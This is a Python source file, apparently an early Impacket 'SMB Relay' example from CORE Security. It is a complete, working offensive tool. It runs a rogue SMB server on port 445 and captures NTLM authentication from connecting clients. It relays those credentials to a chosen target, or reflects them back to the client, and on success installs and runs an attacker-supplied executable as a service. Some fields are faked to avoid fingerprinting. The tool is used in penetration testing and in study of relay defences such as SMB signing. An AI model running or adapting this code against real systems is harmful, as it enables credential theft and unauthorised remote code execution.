#!/usr/bin/python
# Copyright (c) 2012 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# $Id$
#
# SMB Relay Module
#
# Author:
#  Alberto Solino
#
# Description:
#             This module performs the SMB Relay attacks originally discovered by cDc. It receives a 
# list of targets and for every connection received it will choose the next target and try to relay the
# credentials. Also, if specified, it will first to try authenticate against the client connecting to us.
# 
# It is implemented by invoking the smbserver, hooking to a few functions and then using the smbclient
# portion. It is supposed to be working on any LM Compatibility level. The only way to stop this attack 
# is to enforce on the server SPN checks and or signing.
#
# If the authentication against the targets succeed, the client authentication success as well and 
# a valid connection is set against the local smbserver. It's up to the user to set up the local
# smbserver functionality. One option is to set up shares with whatever files you want to the victim
# thinks it's connected to a valid SMB server. All that is done through the smb.conf file.
#

import socket
import string
import sys
import types
import os
import random
import time
import argparse

from impacket import smbserver, smb, ntlm, dcerpc, version
from impacket.dcerpc import dcerpc, transport, srvsvc, svcctl
from impacket.examples import serviceinstall
from smb import *
from smbserver import *

from threading import Thread

class doAttack(Thread):
    def __init__(self, SMBClient, exeFile):
        Thread.__init__(self)
        self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
        

    def run(self):
        # Here PUT YOUR CODE!
        # First of all check whether we're Guest in the target system.
        # If so, we're screwed.
        self.installService.install()
        print "[*] Service Installed.. CONNECT!"
        self.installService.uninstall()

 

class SMBClient(smb.SMB):
    def __init__(self, remote_name, extended_security = True, sess_port = 445):
        self._extendedSecurity = extended_security
        smb.SMB.__init__(self,remote_name, remote_name, sess_port = sess_port)

    def neg_session(self):
        return smb.SMB.neg_session(self, extended_security = self._extendedSecurity)

    def setUid(self,uid):
        self._uid = uid

    def login_standard(self, user, domain, ansiPwd, unicodePwd):
        smb = NewSMBPacket()
        smb['Flags1']  = 8
        
        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Data()

        sessionSetup['Parameters']['MaxBuffer']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']      = 2
        sessionSetup['Parameters']['VCNumber']         = os.getpid()
        sessionSetup['Parameters']['SessionKey']       = self._dialects_parameters['SessionKey']
        sessionSetup['Parameters']['AnsiPwdLength']    = len(ansiPwd)
        sessionSetup['Parameters']['UnicodePwdLength'] = len(unicodePwd)
        sessionSetup['Parameters']['Capabilities']     = SMB.CAP_RAW_MODE

        sessionSetup['Data']['AnsiPwd']       = ansiPwd
        sessionSetup['Data']['UnicodePwd']    = unicodePwd
        sessionSetup['Data']['Account']       = str(user)
        sessionSetup['Data']['PrimaryDomain'] = str(domain)
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)

        self.sendSMB(smb)
        smb = self.recvSMB()
        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except:
            print "[!] Error login_standard"
            return None, STATUS_LOGON_FAILURE
        else:
            self._uid = smb['Uid']
            return smb, STATUS_SUCCESS

    def sendAuth(self, authenticateMessageBlob):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = self._uid

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
        sessionSetup['Data']['SecurityBlob'] = str(authenticateMessageBlob)
        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
            
        smb = self.recvSMB()
        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        return smb, errorCode

    def sendNegotiate(self, negotiateMessage):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
          

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit() 

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
        smb = self.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except:
            print "[!] SessionSetup Error!"
            return None
        else:
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            return respToken['ResponseToken']

class SMBRelayServer:
    def __init__(self):
        self.server = 0
        self.target = '' 
        self.mode = 'REFLECTION'
        self.server = smbserver.SMBSERVER(('0.0.0.0',445))
        self.server.processConfigFile('smb.conf')
        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        self.server.addConnection('SMBRelay', '0.0.0.0', 445)

    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.mode.upper() == 'REFLECTION':
            self.target = connData['ClientIP']
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # won't work until we have IPC on smbserver (if runs as ForkMixIn)
            print "[!] %s has already a connection in progress" % self.target
        else:
            print "[*] Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
            try: 
                if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                    extSec = False
                else:
                    extSec = True
                client = SMBClient(self.target, extended_security = extSec)
                client.set_timeout(60)
            except Exception, e:
                print "[!] Connection against target %s FAILED" % self.target
                print e
            else: 
                encryptionKey = client.get_encryption_key()
                smbData[self.target] = {} 
                smbData[self.target]['SMBClient'] = client
                if encryptionKey is not None:
                    connData['EncryptionKey'] = encryptionKey
                smbServer.setConnectionData('SMBRelay', smbData)
                smbServer.setConnectionData(connId, connData)
        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != smb.ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = smb.SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  smb.SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the 
            # authentication we are, we act on it
            messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client. 
                # Let's send it to the target server and send the answer back to the client.
                smbClient = smbData[self.target]['SMBClient']
                clientChallengeMessage = smbClient.sendNegotiate(token) 
                challengeMessage = ntlm.NTLMAuthChallenge()
                challengeMessage.fromString(clientChallengeMessage)
                #############################################################

                respToken = smb.SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'  
                respToken['SupportedMech'] = smb.TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED
                # Let's set up an UID for this connection and store it 
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10
                # Let's store it in the connection data
                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                smbClient = smbData[self.target]['SMBClient']
                authData = sessionSetupData['SecurityBlob']
                clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'])                
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY 
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = '\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff
                    # Reset the UID
                    smbClient.setUid(0)
                    print "[!] Authenticating against %s as %s\%s FAILED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
                    del (smbData[self.target])
                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
                    del (smbData[self.target])
                    clientThread = doAttack(smbClient,self.exeFile)
                    clientThread.start()
                    # Now continue with the server
                #############################################################

                respToken = smb.SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength'] 
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData       = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']
            #############################################################
            # SMBRelay
            smbClient = smbData[self.target]['SMBClient']
            clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY 
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff
                # Reset the UID
                smbClient.setUid(0)
                return None, [packet], errorCode
                # Now continue with the server
            else:
                # We have a session, create a thread and do whatever we want
                del (smbData[self.target])
                clientThread = doAttack(smbClient,self.exeFile)
                clientThread.start()
                # Remove the target server from our connection list, the work is done
                # Now continue with the server

            #############################################################

            # Do the verification here, for just now we grant access
            # TODO: Manage more UIDs for the same session
            errorCode = STATUS_SUCCESS
            connData['Uid'] = 10
            respParameters['Action'] = 0

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData 

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True
        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    def start(self):
        self.server.serve_forever()

    def setTargets(self, targets):
        self.target = targets 

    def setExeFile(self, filename):
        self.exeFile = filename

    def setMode(self,mode):
        self.mode = mode

# Process command-line arguments.
if __name__ == '__main__':

    print version.BANNER
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
    parser.add_argument("--help", action="help", help='show this help message and exit')
    parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
    parser.add_argument('-e', action='store', required=True, metavar = 'FILE', help='File to execute on the target system')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    try:
       options = parser.parse_args()
    except Exception, e:
       print e
       sys.exit(1)

    print "[*] Setting up SMB Server"
    if options.h is not None:
        print "[*] Running in relay mode"
        mode = 'RELAY'
        targetSystem = options.h
    else:
        print "[*] Running in reflection mode"
        targetSystem = None
        mode = 'REFLECTION'

    exeFile = options.e
    s = SMBRelayServer()
    s.setTargets(targetSystem)
    s.setExeFile(exeFile)
    s.setMode(mode)
    print "[*] Starting server, waiting for connections"
    s.start() 
